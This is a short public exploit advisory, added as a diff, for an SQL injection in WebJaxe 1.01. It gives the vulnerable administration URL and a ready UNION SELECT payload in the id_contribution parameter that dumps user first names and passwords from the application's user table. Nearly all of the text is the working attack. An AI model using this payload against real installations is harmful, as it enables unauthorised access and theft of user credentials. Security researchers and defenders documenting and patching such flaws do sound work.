@@ -1,0 +1,17 @@
+###############################################################################
+#
+# Exploit Title: WebJaxe Sql Injection
+# Date: 14-05-2010
+# Author: IHTeam
+# Software Link: http://media4.obspm.fr/outils/webjaxe/en/
+# Version: 1.01
+# Tested on: Win/Linux
+#
+###############################################################################
+
+!You need a registred user!
+
+http://[site]/[path]/php/partie_administrateur/administration.php?page=projet_contribution&id_contribution=[SQL]
+
+Example (Show username:password):
+http://localhost/webjaxe/php/partie_administrateur/administration.php?page=projet_contribution&id_contribution=-1/**/UNION/**/ALL/**/SELECT/**/1,concat(prenom,char(58),motdepasse),3,4,5,6/**/FROM/**/utilisateurs
